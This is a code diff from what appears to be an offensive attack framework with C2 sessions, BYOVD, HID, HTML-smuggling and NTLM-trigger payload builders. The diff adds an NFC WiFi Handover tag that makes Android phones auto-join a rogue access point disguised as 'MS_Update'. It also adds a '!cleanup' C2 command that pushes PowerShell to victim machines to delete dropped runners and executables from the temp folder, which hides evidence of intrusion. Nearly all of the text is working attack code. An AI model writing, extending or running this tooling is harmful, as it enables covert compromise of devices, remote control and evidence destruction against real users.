@@ -312,7 +312,7 @@ from builders.byovd   import build_byovd, build_byovd_sc
 from builders.usbhid  import build_usb_payload, DEVICES as USB_DEVICES
 from builders.blehid   import build_ble_payload, DEVICES as BLE_DEVICES, build_android_ble_payload, ANDROID_DEVICES
 from builders.lora_c2  import build_lora_payload
-from builders.nfc_tag  import build_nfc_payload
+from builders.nfc_tag  import build_nfc_payload, build_nfc_wifi_payload
 from builders.android  import build_android_payload
 from builders.smuggle    import build_smuggle_payload, LURE_PRESETS as SMUGGLE_LURES, load_inject_js
 from builders.ntlm_trigger import build_ntlm_triggers
@@ -731,6 +731,14 @@ def cmd_build(args, cfg, ws):
             url_prefix = "/android/"
             nfc_url    = f"{scheme}://{lhost}:{port}{url_prefix}"
         build_nfc_payload(nfc_url, nfc_out)
+        did_something = True
+
+    # ── NFC WiFi Handover tag (auto-connects Android to T-Embed AP) ───────────
+    if getattr(args, "nfc_wifi", False):
+        nfc_wifi_out  = getattr(args, "nfc_wifi_out",  None) or ws.path("nfc")
+        nfc_wifi_ssid = getattr(args, "nfc_wifi_ssid", None) or cfg.get("lora_ssid", "MS_Update")
+        nfc_wifi_pass = getattr(args, "nfc_wifi_pass", None) or cfg.get("lora_pass", "Upd@te2024!")
+        build_nfc_wifi_payload(nfc_wifi_ssid, nfc_wifi_pass, nfc_wifi_out)
         did_something = True
 
     # ── HTML Smuggling → ISO → LNK ────────────────────────────────────────────
@@ -1172,7 +1180,7 @@ def cmd_c2(args, cfg, ws):
 
     # ── Interactive REPL ───────────────────────────────────────────────────────
     print(f"[*] C2 shell → session {sid}")
-    print(f"    Built-in: migrate [proc.exe]  |  !persist wmi|run|schtask  |  !kill  |  !timeout <sec>\n")
+    print(f"    Built-in: migrate [proc.exe]  |  !persist wmi|run|schtask  |  !kill  |  !timeout <sec>  |  !cleanup\n")
     while True:
         try:
             cmd_input = input("C2> ").strip()
@@ -1210,6 +1218,18 @@ def cmd_c2(args, cfg, ws):
             if not pcmd:
                 continue
             result = _push_and_wait(sid, pcmd)
+            if result is not None:
+                print(result)
+            continue
+
+        if cmd_input == "!cleanup":
+            runner_name = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
+            clean_cmds  = (
+                f'Remove-Item "$env:TEMP\\{runner_name}" -Force -EA SilentlyContinue; '
+                f'Get-ChildItem $env:TEMP -Filter "wct*.exe" | Remove-Item -Force -EA SilentlyContinue; '
+                f'"[+] cleanup done"'
+            )
+            result = _push_and_wait(sid, clean_cmds)
             if result is not None:
                 print(result)
             continue
@@ -1558,6 +1578,14 @@ def main():
                          help="Override NFC tag URL (default: Android APK lure page)")
     build_p.add_argument("--nfc-out",      metavar="DIR",   dest="nfc_out",  default=None,
                          help="Output directory for NFC tag files (default: <workspace>/nfc/)")
+    build_p.add_argument("--nfc-wifi",     action="store_true", dest="nfc_wifi",
+                         help="Generate NFC WiFi Handover tag (WFA WSC): Android auto-connects to T-Embed AP on tap")
+    build_p.add_argument("--nfc-wifi-ssid", metavar="SSID", dest="nfc_wifi_ssid", default=None,
+                         help="SSID for NFC WiFi Handover tag (default: lora_ssid from config or MS_Update)")
+    build_p.add_argument("--nfc-wifi-pass", metavar="PASS", dest="nfc_wifi_pass", default=None,
+                         help="WPA2 passphrase for NFC WiFi Handover tag (default: lora_pass from config)")
+    build_p.add_argument("--nfc-wifi-out",  metavar="DIR",  dest="nfc_wifi_out",  default=None,
+                         help="Output directory for WiFi Handover NDEF (default: <workspace>/nfc/)")
     build_p.add_argument("--lora",         action="store_true", dest="lora",
                          help="Generate LoRa C2 relay kit: T-Embed Plus WiFi AP + LoRa bridge + PS1 beacon loop")
     build_p.add_argument("--lora-ssid",    metavar="SSID",  dest="lora_ssid",   default="MS_Update",
